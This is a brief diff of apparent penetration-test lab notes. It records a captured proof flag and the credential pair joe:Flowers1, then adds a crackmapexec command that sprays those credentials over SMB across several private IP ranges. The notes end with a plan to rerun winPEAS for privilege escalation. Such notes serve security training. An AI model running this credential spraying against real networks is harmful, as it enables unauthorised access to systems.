@@ -133,4 +133,8 @@ PS C:\Users\Administrator\Desktop> type proof.txt
 a21cde38548900a820e8aeb8f25295f0
 
 # Now we owned the joe:Flowers1 credentials, we can try the crackmapexec to find out what joe can access
+sudo crackmapexec smb 192.168.215.120-122 172.16.215.10-14 172.16.215.82-83 -u joe -p Flowers1 --continue-on-success
+
+# Nothing we can touch.. Lets run the winPEAS again from C:\TEMP
+
 
